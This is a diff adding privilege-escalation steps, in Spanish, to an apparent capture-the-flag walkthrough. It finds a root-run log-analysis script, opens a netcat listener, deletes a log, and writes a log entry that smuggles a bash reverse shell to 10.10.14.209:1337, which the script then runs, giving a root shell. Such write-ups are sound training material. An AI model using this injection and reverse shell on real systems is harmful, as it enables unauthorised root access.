@@ -277,4 +277,73 @@
     ´´´
 
    <img width="886" height="580" alt="image" src="https://github.com/user-attachments/assets/c62693b5-812c-4d47-879d-fabaf641c73f" />
- 
+
+   <img width="951" height="236" alt="image" src="https://github.com/user-attachments/assets/1499948e-7934-405d-aafe-d8e77f4401d1" />
+
+
+   Podemos observar q tenemos el acceso exitoso con la salida de:
+   
+    ```bash
+    -bash-5.0$
+    ´´´
+
+### 16. Busqueda de una posibilidad de posibles vectores de escalada
+
+
+   Con acceso como miranda-wise, intentamos identificar procesos o scripts que se estén ejecutando con privilegios elevados o desde cron.
+
+   Buscamos scripts .sh ejecutables:
+
+    ```bash
+    find /opt -type f -name "*.sh" -executable 2>/dev/null
+    ´´´
+  <img width="772" height="35" alt="image" src="https://github.com/user-attachments/assets/feabd045-9bbb-41de-be62-e9715436d9c4" />
+
+
+  Como podemos observar en la imagen no devolvió nada ejecutable, pero entonces hicimos una búsqueda por nombre:
+
+    ```bash
+    find / -type f -name "*log_analyse.sh*" 2>/dev/null
+    ´´´
+  
+  <img width="606" height="33" alt="image" src="https://github.com/user-attachments/assets/f428ca82-c168-4a25-9702-4fd748cf1f9f" />
+
+  Obtenemos como resultado:
+
+    ```bash
+     /opt/log_analyse.sh
+    ´´´
+
+
+
+### 17. Limpiamos el archivo de logs previo
+
+   Primero abrimos el listener en Kali en otro terminal:
+     ```bash
+      rlwrap nc -nlvp 1337
+     ´´´
+   
+   Despues eliminamos el log anterior:
+    
+    ```bash
+     rm -f /var/www/web/user-management-service/log/application.log
+    ´´´
+  <img width="998" height="21" alt="image" src="https://github.com/user-attachments/assets/49aefc06-67c5-414c-9829-5fb57d127d22" />
+
+
+  Ahora usamos una expresión como esta para forzar la ejecución de un reverse shell en el archivo de logs:
+
+     ```bash
+      echo 'HTTP Status: x[$(/bin/bash -i >& /dev/tcp/10.10.14.209/1337 0>&1)]' \ > /var/www/web/user-management-service/log/application.log
+     ´´´
+
+ <img width="1176" height="18" alt="image" src="https://github.com/user-attachments/assets/a4d655bd-88de-420b-b553-a360603a0845" />
+
+### 18. Ejecución automática y shell como root
+
+   Después de unos segundos , se disparó el script y la sesión recibió la reverse shell directamente como root
+
+    
+   <img width="722" height="188" alt="image" src="https://github.com/user-attachments/assets/bdaf1426-d511-4cc3-8656-5a25fc9e373d" />
+
+   Con esto podemos tener el acceso total a la maquina
